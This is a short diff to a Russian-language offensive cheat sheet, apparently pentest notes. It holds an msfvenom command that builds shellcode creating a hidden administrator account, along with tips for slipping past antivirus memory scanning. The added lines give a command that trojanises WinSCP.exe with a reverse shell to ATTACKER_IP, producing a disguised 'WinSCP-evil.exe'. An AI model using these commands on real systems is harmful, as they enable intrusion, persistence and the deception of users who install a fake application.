@@ -260,3 +260,10 @@ csc.exe EncStageless.cs
 Чтобы обойти палево в памяти нужно повторить попытку еще раз или сделать короткую команду msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp
 
 или запустить еще один cmd.exe (антвирус спалит процесс но не последующие процессы)
+
+
+
+# Иньекция пайлоада в файл
+
+     msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
+
